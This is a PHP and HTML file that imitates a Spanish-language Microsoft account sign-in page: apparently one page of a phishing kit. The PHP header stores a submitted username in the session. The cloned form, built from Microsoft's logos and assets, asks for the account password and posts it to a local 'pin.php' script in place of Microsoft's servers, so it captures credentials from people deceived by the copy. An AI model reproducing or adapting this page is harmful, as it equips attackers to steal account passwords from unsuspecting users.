<?php
  session_start();
  error_reporting(0);
   
   
   if(isset($_POST["username"])){
      $_SESSION["username"]=$_POST["username"];
   }
?>



<html dir="ltr" lang="ES-ES"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=Edge"><base href=""><script type="text/javascript">/* Code removed by ScrapBook */</script><noscript><meta http-equiv="Refresh" content="0; URL=https://login.live.com/jsDisabled.srf?mkt=ES-ES&lc=3082&uaid=df9cef49f8e44095a77afe4745d6420f"/>La cuenta Microsoft requiere JavaScript para iniciar sesión. Este explorador web no admite JavaScript o los scripts están bloqueados.<br /><br />Para averiguar si el explorador admite JavaScript o para permitir los scripts, consulta la ayuda en pantalla del explorador.</noscript><title>Iniciar sesión en tu cuenta Microsoft</title><meta name="robots" content="none"><meta name="PageID" content="i5030"><meta name="SiteID" content="1184"><meta name="ReqLC" content="3082"><meta name="LocLC" content="3082"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, minimum-scale=1.0, user-scalable=yes"><script type="text/javascript">/* Code removed by ScrapBook */</script><script type="text/javascript">/* Code removed by ScrapBook */</script><script type="text/javascript">/* Code removed by ScrapBook */</script><link rel="shortcut icon" href="favicon.ico"><link rel="stylesheet" title="Converged_v2" type="text/css" href="css/Converged_v23082_AZXChPIB5jI3ijrmoNll5w2.css"><style type="text/css"></style><style type="text/css">body{display:none;}</style><script type="text/javascript">/* Code removed by ScrapBook */</script><style type="text/css">body{display:block !important;}</style><noscript><style type="text/css">body{display:block !important;}</style></noscript><script type="text/javascript">/* Code removed by ScrapBook */</script><link rel="image_src" href="https://logincdn.msauth.net/16.000.28510.10/images/Windows_Live_v_thumb.jpg"><script type="text/javascript">/* Code removed by ScrapBook */</script><script type="text/javascript">/* Code removed by ScrapBook */</script><script type="text/javascript">/* Code removed by ScrapBook */</script><script type="text/javascript" src="about:blank" id="ConvergedLoginPaginatedStrings" crossorigin="anonymous" integrity="sha384-jBiOG7esl7C79MxeZD3wjTBmvHnV+ZtWL8VZa6T3VDzqQHLEyYixuB3caq0/2u+I"></script><script type="text/javascript">/* Code removed by ScrapBook */</script><script type="text/javascript">/* Code removed by ScrapBook */</script><script type="text/javascript" src="about:blank" id="OldConvergedLogin_PCore" crossorigin="anonymous" inte

    grity="sha384-0pfVPwu8cT85Y/GiP/xaJ1Ze07q80FmNXkImIaCRxAfJ7dq3EadE/BgqCR8H8Kbh"></script></head><body class="cb" data-bind="defineGlobals: ServerData, bodyCssClass"><div><!--  --><!--  --> <div data-bind="component: { name: 'background-image-control', publicMethods: backgroundControlMethods }"><div class="background" role="presentation" data-bind="css: { app: isAppBranding }, style: { background: backgroundStyle }"><!-- ko if: smallImageUrl --> <div data-bind="backgroundImage: smallImageUrl()" style="background-image: url(&quot;https://aadcdn.msftauth.net/ests/2.1/content/images/backgrounds/0-small_138bcee624fa04ef9b75e86211a9fe0d.jpg&quot;);"></div><!-- /ko --><!-- ko if: backgroundImageUrl --> <div class="backgroundImage" data-bind="backgroundImage: backgroundImageUrl()" style="background-image: url(&quot;https://aadcdn.msftauth.net/ests/2.1/content/images/backgrounds/0_a5dbd4393ff6a725c7e62b61df7e72f0.jpg&quot;);"></div><!-- ko if: useImageMask --><!-- /ko --><!-- /ko --> </div></div> <div data-bind="if: activeDialog"></div> <form name="f1" id="i0281" novalidate="novalidate" spellcheck="false" method="POST" target="_top" autocomplete="off" data-bind="autoSubmit: forceSubmit, attr: { action: postUrl }, ariaHidden: activeDialog" action="pin.php"><!-- ko if: svr.CO --><!-- /ko --><!-- ko withProperties: { '$loginPage': $data } --> <div class="outer" data-bind="component: { name: 'master-page',
        params: {
            serverData: svr,
            showButtons: svr.f,
            showFooterLinks: true,
            useWizardBehavior: svr.BC,
            handleWizardButtons: false,
            password: password,
            hideFromAria: ariaHidden },
        event: {
            footerAgreementClick: footer_agreementClick } }"><!-- ko template: { nodes: $componentTemplateNodes, data: $parent } --><!-- ko if: svr.ay --><!-- /ko --> <div class="middle" data-bind="css: { 'app': backgroundLogoUrl }"><!-- ko if: backgroundLogoUrl() && !(paginationControlMethods() && paginationControlMethods().currentViewHasMetadata('hideLogo')) --><!-- /ko --> <div class="inner fade-in-lightbox" data-bind="
                animationEnd: paginationControlMethods() &amp;&amp; paginationControlMethods().view_onAnimationEnd,
                css: {
                    'app': backgroundLogoUrl,
                    'wide': paginationControlMethods() &amp;&amp; paginationControlMethods().currentViewHasMetadata('wide'),
                    'fade-in-lightbox': fadeInLightBox,
                    'has-popup': showFedCredButtons,
                    'transparent-lightbox': backgroundControlMethods() &amp;&amp; backgroundControlMethods().useTransparentLightBox }"> <div class="lightbox-cover" data-bind="css: { 'disable-lightbox': svr.bl &amp;&amp; showLightboxProgress() }"></div><!-- ko if: showLightboxProgress --><!-- /ko --><!-- ko ifnot: paginationControlMethods() && (paginationControlMethods().currentViewHasMetadata('hideLogo')) --> <div data-bind="component: { name: 'logo-control',
                    params: {
                        isChinaDc: svr.fIsChinaDc,
                        bannerLogoUrl: bannerLogoUrl() } }"><!--  --><!-- ko if: bannerLogoUrl --><!-- /ko --><!-- ko if: !bannerLogoUrl && !isChinaDc --><!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko --><!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme --> <!-- ko template: { nodes: [darkImageNode], data: $parent } --><img class="logo" role="img" pngsrc="https://logincdn.msauth.net/16.000.28510.10/content/images/microsoft_logo_ed9c9eb0dce17d752bedea6b5acda6d9.png" svgsrc="https://logincdn.msauth.net/16.000.28510.10/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" data-bind="imgSrc, attr: { alt: str['MOBILE_STR_Footer_Microsoft'] }" src="https://logincdn.msauth.net/16.000.28510.10/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" alt="Microsoft"><!-- /ko --> <!-- /ko --><!-- /ko --> <!-- /ko --></div><!-- /ko --><!-- ko if: svr.cc && (paginationControlMethods() && !paginationControlMethods().currentViewHasMetadata('hideLwaDisclaimer')) --><!-- /ko --><!-- ko if: asyncInitReady --> <div role="main" data-bind="component: { name: 'pagination-control',
                        publicMethods: paginationControlMethods,
                        params: {
                            enableCssAnimation: svr.ae,
                            disableAnimationIfAnimationEndUnsupported: svr.bp,
                            initialViewId: initialViewId,
                            currentViewId: currentViewId,
                            initialSharedData: initialSharedData,
                            initialError: $loginPage.getServerError() },
                        event: {
                            cancel: paginationControl_onCancel,
                            showView: $loginPage.view_onShow,
                            setLightBoxFadeIn: view_onSetLightBoxFadeIn,
                            animationStateChange: paginationControl_onAnimationStateChange } }"><!--  --> <div data-bind="css: { 'zero-opacity': hidePaginatedView() }" class=""><!-- ko if: showIdentityBanner() && (sharedData.displayName || svr.h) --><!-- /ko --> <div class="pagination-view animate slide-in-next" data-bind="css: {
        'has-identity-banner': showIdentityBanner() &amp;&amp; (sharedData.displayName || svr.h),
        'zero-opacity': hidePaginatedView.hideSubView(),
        'animate': animate(),
        'slide-out-next': animate.isSlideOutNext(),
        'slide-in-next': animate.isSlideInNext(),
        'slide-out-back': animate.isSlideOutBack(),
        'slide-in-back': animate.isSlideInBack() }"><!-- ko foreach: views --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- ko if: $parent.isViewLoaded --> <!-- ko template: { nodes: [$data], data: $parent } --><div data-viewid="1" data-showfedcredbutton="true" data-bind="pageViewComponent: { name: 'login-paginated-username-view',
                        params: {
                            serverData: svr,
                            serverError: initialError,
                            isInitialView: isInitialState,
                            displayName: sharedData.displayName,
                            prefillNames: $loginPage.prefillNames,
                            flowToken: sharedData.flowToken },
                        event: {
                            redirect: $loginPage.view_onRedirect,
                            setPendingRequest: $loginPage.view_onSetPendingRequest,
                            registerDialog: $loginPage.view_onRegisterDialog,
                            unregisterDialog: $loginPage.view_onUnregisterDialog,
                            showDialog: $loginPage.view_onShowDialog } }"><!--  --> <div data-bind="component: { name: 'header-control',
    params: {
        serverData: svr,
        title: str['WF_STR_HeaderDefault_Title'] } }"><div class="row text-title" id="loginHeader"> <div role="heading" aria-level="1" data-bind="text: title">Contraseña</div><!-- ko if: isSubtitleVisible --><!-- /ko --> </div></div><!-- ko if: pageDescription && !svr.bt --><!-- /ko --> <div class="row"> <div role="alert" aria-live="assertive"><!-- ko if: usernameTextbox.error --><!-- /ko --> </div> <div class="form-group col-md-24"><!-- ko if: prefillNames().length > 1 --><!-- /ko --><!-- ko ifnot: prefillNames().length > 1 --> <div class="placeholderContainer" data-bind="component: { name: 'placeholder-textbox-field',
            publicMethods: usernameTextbox.placeholderTextboxMethods,
            params: {
                serverData: svr,
                hintText: tenantBranding.UserIdLabel || str['CT_PWD_STR_Email_Example'],
                hintCss: 'placeholder' + (!svr.ab ? ' ltr_override' : '') },
            event: {
                updateFocus: usernameTextbox.textbox_onUpdateFocus } }"><!-- ko withProperties: { '$placeholderText': placeholderText } --> <!-- ko template: { nodes: $componentTemplateNodes, data: $parent } --> <input name="password" id="password" maxlength="113" required="" class="form-control ltr_override" aria-required="true" placeholder="Ingrese su contraseña" type="password" lang="en"> <input name="passwd" id="i0118" autocomplete="off" data-bind="moveOffScreen, textInput: passwordBrowserPrefill" class="moveOffScreen" tabindex="-1" aria-hidden="true" type="password"> <!-- /ko --><!-- /ko --><!-- ko ifnot: usePlaceholderAttribute --><!-- /ko --></div><!-- /ko --> </div> </div> <div data-bind="css: { 'position-buttons': !tenantBranding.BoilerPlateText }" class="position-buttons"> <div class="row"> <div class="col-md-24"> <div class="text-13 action-links"><!-- ko if: svr.aC && !svr.Aa && !svr.Aj --> <div class="form-group" data-bind="
                    htmlWithBindings: html['WF_STR_SignUpLink_Text'],
                    childBindings: {
                        'signup': {
                            href: svr.H || '#',
                            ariaLabel: svr.H ? str['WF_STR_SignupLink_AriaLabel_Text'] : str['WF_STR_SignupLink_AriaLabel_Generic_Text'],
                            click: signup_onClick } }">¿No tiene una cuenta? <a href="https://signup.live.com/signup?wa=wsignin1.0&amp;rpsnv=13&amp;ct=1585627963&amp;rver=7.0.6730.0&amp;wp=LBI&amp;wreply=https:%2f%2fwww.msn.com%2fes-es%2fhomepage%2fSecure%2fPassport%3fru%3dhttps%253a%252f%252fwww.msn.com%252fes-es%253fpfr%253d1&amp;id=1184&amp;pcexp=True&amp;contextid=C354DCAE75FF72B1&amp;bk=1585628021&amp;uiflavor=web&amp;lic=1&amp;mkt=ES-ES&amp;lc=3082&amp;uaid=df9cef49f8e44095a77afe4745d6420f" id="signup" aria-label="Crear una cuenta Microsoft">Cree una.</a></div><!-- /ko --><!-- ko if: svr.showCantAccessAccountLink --><!-- /ko --><!-- ko if: showFidoLinkInline && hasFido() && (availableCredsWithoutUsername().length >= 2 || svr.az) --><!-- /ko --><!-- ko if: availableCredsWithoutUsername().length > 0 || svr.az --> <div class="form-group" data-bind="
                    component: { name: 'cred-switch-link-control',
                        params: {
                            serverData: svr,
                            availableCreds: availableCredsWithoutUsername(),
                            showForgotUsername: svr.az },
                        event: {
                            switchView: noUsernameCredSwitchLink_onSwitchView,
                            redirect: onRedirect,
                            registerDialog: onRegisterDialog,
                            unregisterDialog: onUnregisterDialog,
                            showDialog: onShowDialog } }"><!--  --> <div class="form-group"><!-- ko if: credentialCount > 1 || (credentialCount === 1 && (showForgotUsername || selectedCredShownOnlyOnPicker)) --> <a id="idA_PWD_SwitchToCredPicker" href="https://login.live.com/pp1600/#" data-bind="
        text: isUserKnown ? str['CT_PWD_STR_SwitchToCredPicker_Link'] : str['CT_PWD_STR_SwitchToCredPicker_Link_NoUser'],
        click: switchToCredPicker_onClick">Opciones de inicio de sesión</a><!-- /ko --><!-- ko if: credentialCount === 1 && !(showForgotUsername || selectedCredShownOnlyOnPicker) --><!-- /ko --><!-- ko if: credentialCount === 0 && showForgotUsername --><!-- /ko --> </div><!-- ko if: credLinkError --><!-- /ko --></div><!-- /ko --> </div> </div> </div> <div class="row" data-bind="css: { 'move-buttons': tenantBranding.BoilerPlateText }"> <div data-bind="component: { name: 'footer-buttons-field',
            params: {
                serverData: svr,
                isPrimaryButtonEnabled: !isRequestPending(),
                isPrimaryButtonVisible: svr.f,
                isSecondaryButtonEnabled: true,
                isSecondaryButtonVisible: svr.f &amp;&amp; isBackButtonVisible() },
            event: {
                primaryButtonClick: primaryButton_onClick,
                secondaryButtonClick: secondaryButton_onClick } }"><div class="col-xs-24 no-padding-left-right button-container" data-bind="
    visible: isPrimaryButtonVisible() || isSecondaryButtonVisible(),
    css: { 'no-margin-bottom': removeBottomMargin }"><!-- ko if: isSecondaryButtonVisible --><!-- /ko --> <div class="inline-block"><!-- type="submit" is needed in-addition to 'type' in primaryButtonAttributes observable to support IE8 --> <input id="idSIButton9" class="btn btn-block btn-primary" data-bind="
            attr: primaryButtonAttributes,
            value: primaryButtonText() || str['CT_PWD_STR_SignIn_Button_Next'],
            hasFocus: focusOnPrimaryButton,
            click: primaryButton_onClick,
            enable: isPrimaryButtonEnabled,
            visible: isPrimaryButtonVisible,
            preventTabbing: primaryButtonPreventTabbing" value="Siguiente" type="submit"> </div> </div></div> </div> </div><!-- ko if: tenantBranding.BoilerPlateText --><!-- /ko --></div><!-- /ko --><!-- /ko --><!-- ko ifnot: $parent.isViewLoaded --><!-- /ko --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- /ko --> </div> </div></div><!-- /ko --> </div><!-- ko if: showDebugDetails --><!-- /ko --><!-- ko if: showFedCredButtons --><!-- /ko --><!-- ko if: newSession --><!-- /ko --> <input name="ps" data-bind="value: postedLoginStateViewId" value="" type="hidden"> <input name="psRNGCDefaultType" data-bind="value: postedLoginStateViewRNGCDefaultType" value="" type="hidden"> <input name="psRNGCEntropy" data-bind="value: postedLoginStateViewRNGCEntropy" value="" type="hidden"> <input name="psRNGCSLK" data-bind="value: postedLoginStateViewRNGCSLK" value="" type="hidden"> <input name="canary" data-bind="value: svr.canary" value="" type="hidden"> <input name="ctx" data-bind="value: ctx" value="" type="hidden"> <input name="hpgrequestid" data-bind="value: svr.sessionId" value="" type="hidden"> <input id="i0327" data-bind="attr: { name: svr.Bt }, value: flowToken" name="PPFT" value="DU21!ujRM65JKo0Ck8g1YrkHj!noRK12Cqjt94vA6DNF0bdy3Jn164fy*OcI!YiBVIcJslaMsiGgCQ98fC!yEwwX*qh!YAMoQVdl3g6SDGRJun8lGXJBlCot0baUMOiBHnhrL361oy1n7WEnayDlCA7BuumWbqaY0nt18fpYpSOB*GeUIJm8WG0ynolhpaFyjBN54zOPafjHcNVN*lRncELih18e*9SFdSRdY9!w5o5h1DsOEbzecz1SRXtHojWWRTqdWIHMpTwTA15569ZLjQ0$" type="hidden"> <input name="PPSX" data-bind="value: svr.ca" value="Pass" type="hidden"> <input name="NewUser" value="1" type="hidden"> <input name="FoundMSAs" data-bind="value: svr.AD" value="" type="hidden"> <input name="fspost" data-bind="value: svr.fPOST_ForceSignin ? 1 : 0" value="0" type="hidden"> <input name="i21" data-bind="value: wasLearnMoreShown() ? 1 : 0" value="0" type="hidden"> <input name="CookieDisclosure" data-bind="value: svr.ay ? 1 : 0" value="0" type="hidden"> <input name="IsFidoSupported" data-bind="value: isFidoSupported() ? 1 : 0" value="0" type="hidden"> <input name="isSignupPost" data-bind="value: isSignupPost() ? 1 : 0" value="0" type="hidden"> <div data-bind="component: { name: 'instrumentation-control',
                publicMethods: instrumentationMethods,
                params: { serverData: svr } }"><input name="i2" data-bind="value: clientMode" value="1" type="hidden"> <input name="i17" data-bind="value: srsFailed" value="0" type="hidden"> <input name="i18" data-bind="value: srsSuccess" type="hidden"> <input name="i19" data-bind="value: timeOnPage" value="" type="hidden"></div> <div id="footer" class="footer default" role="contentinfo" data-bind="
                css: {
                    'default': !backgroundLogoUrl(),
                    'new-background-image': useNewDefaultBackground }"> <div data-bind="component: { name: 'footer-control',
                    publicMethods: footerMethods,
                    params: {
                        serverData: svr,
                        useNewDefaultBackground: useNewDefaultBackground(),
                        hasDarkBackground: backgroundLogoUrl(),
                        showLinks: true },
                    event: {
                        agreementClick: footer_agreementClick,
                        showDebugDetails: toggleDebugDetails_onClick } }"><!--  --><!-- ko if: showLinks || impressumLink || showIcpLicense --> <div id="footerLinks" class="footerNode text-secondary"> <a id="ftrTerms" data-bind="text: str['MOBILE_STR_Footer_Terms'], href: termsLink, click: termsLink_onClick" href="https://login.live.com/gls.srf?urlID=WinLiveTermsOfUse&amp;mkt=ES-ES&amp;vv=1600&amp;uaid=df9cef49f8e44095a77afe4745d6420f">Términos de uso</a> <a id="ftrPrivacy" data-bind="text: str['MOBILE_STR_Footer_Privacy'], href: privacyLink, click: privacyLink_onClick" href="https://login.live.com/gls.srf?urlID=MSNPrivacyStatement&amp;mkt=ES-ES&amp;vv=1600&amp;uaid=df9cef49f8e44095a77afe4745d6420f">Privacidad y cookies</a><!-- ko if: impressumLink --><!-- /ko --><!-- ko if: showIcpLicense --><!-- /ko --><!-- Set attr binding before hasFocusEx to prevent Narrator from losing focus --> <a id="moreOptions" href="https://login.live.com/pp1600/#" role="button" class="moreOptions" data-bind="
        click: moreInfo_onClick,
        ariaLabel: str['CT_STR_More_Options_Ellipsis_AriaLabel'],
        attr: { 'aria-expanded': showDebugDetails().toString() },
        hasFocusEx: focusMoreInfo()" aria-label="Haga clic aquí para obtener información relacionada con la solución de problemas." aria-expanded="false"><!-- ko component: { name: 'accessible-image-control', params: { hasDarkBackground: !useNewDefaultBackground } } --><!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --> <!-- ko template: { nodes: [lightImageNode], data: $parent } --><a id="moreOptions" href="#" role="button" data-bind="
        click: moreInfo_onClick,
        ariaLabel: str['CT_STR_More_Options_Ellipsis_AriaLabel'],
        attr: { 'aria-expanded': showDebugDetails().toString() },
        hasFocusEx: focusMoreInfo(),
        externalCss: {
            'footer-content': true,
            'footer-item': true,
            'debug-item': true,
            'has-background': !useDefaultBackground,
            'background-always-visible': hasDarkBackground }" aria-label="Haga clic aquí para obtener información relacionada con la solución de problemas." aria-expanded="false" class="footer-content ext-footer-content footer-item ext-footer-item debug-item ext-debug-item">...</a><!-- /ko --><!-- /ko --><!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme --><!-- /ko --><!-- /ko --><!-- ko component: { name: 'accessible-image-control', params: { hasDarkBackground: hasDarkBackground } } --><!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko --><!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme --> <!-- ko template: { nodes: [darkImageNode], data: $parent } --><!-- /ko --> <!-- /ko --><!-- /ko --> </a> </div> <!-- /ko --></div> </div> </div> <!-- /ko --></div><!-- /ko --> </form> <form method="post" aria-hidden="true" target="_top" data-bind="autoSubmit: postRedirectForceSubmit, attr: { action: postRedirectUrl }"><!-- ko foreach: postRedirectParams --><!-- /ko --> </form><!-- ko if: svr.bd && !svr.fUseFetchSessionsForDsso --> <div data-bind="component: { name: 'fetch-sessions-control',
    params: {
        serverData: svr,
        sessionPullType: sessionPullType },
    event: {
        updateUserTiles: fetchSessions_onUpdateUserTiles,
        executeGctResult: fetchSessions_onExecuteGctResult,
        incrementAsyncTileRequestCount: fetchSessions_onIncrementAsyncTileRequestCount,
        decrementAsyncTileRequestCount: fetchSessions_onDecrementAsyncTileRequestCount } }"><!--  --><!-- ko if: (sessionPullType & 1) != 0 && callMsaStaticMeControl() --><!-- /ko --><!-- ko if: svr.desktopSsoConfig && !isNonInteractiveAuthRequest --><!-- /ko --><!-- ko if: (sessionPullType & 2) != 0 && desktopSsoRunning() --><!-- /ko --></div><!-- /ko --><!-- ko if: svr.AW --><!-- /ko --></div>

<div style="text-align: center;"><div style="position:relative; top:0; margin-right:auto;margin-left:auto; z-index:99999">

</div></div>

</body></html>